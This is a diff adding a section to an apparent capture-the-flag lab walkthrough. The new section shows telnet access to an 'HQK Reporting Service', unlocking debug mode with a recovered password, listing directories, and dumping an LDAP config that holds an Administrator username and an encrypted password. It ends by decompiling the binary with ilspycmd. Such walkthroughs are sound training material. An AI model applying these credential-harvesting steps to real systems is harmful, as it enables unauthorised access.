@@ -501,3 +501,76 @@ cat 'Debug Mode Password.txt:Password'
 WBQ201953D8w 
 
 ```
+Connected to the service using telnet:
+
+```bash
+telnet 10.129.149.154 4386
+Trying 10.129.149.154...
+Connected to 10.129.149.154.
+Escape character is '^]'.
+
+HQK Reporting Service V1.2
+
+>help
+
+This service allows users to run queries against databases using the legacy HQK format
+
+--- AVAILABLE COMMANDS ---
+
+LIST
+SETDIR <Directory_Name>
+RUNQUERY <Query_ID>
+DEBUG <Password>
+HELP <Command>
+>DEBUG WBQ201953D8w
+
+Debug mode enabled. Use the HELP command to view additional commands that are now available
+
+```
+
+
+```bash
+>SETDIR C:\Program Files\HQK\
+
+Current directory set to HQK
+>LIST
+
+Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command
+
+ QUERY FILES IN CURRENT DIRECTORY
+
+[DIR]  ALL QUERIES
+[DIR]  LDAP
+[DIR]  Logs
+[1]   HqkSvc.exe
+[2]   HqkSvc.InstallState
+[3]   HQK_Config.xml
+```
+
+```bash
+>SETDIR LDAP   
+
+Current directory set to LDAP
+>list
+
+Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command
+
+ QUERY FILES IN CURRENT DIRECTORY
+
+[1]   HqkLdap.exe
+[2]   Ldap.conf
+```
+
+```bash
+>SHOWQUERY 2
+
+Domain=nest.local
+Port=389
+BaseOu=OU=WBQ Users,OU=Production,DC=nest,DC=local
+User=Administrator
+Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=
+```
+
+```bash
+ilspycmd -o DecompiledOutput/ "HqkLdap.exe"
+```
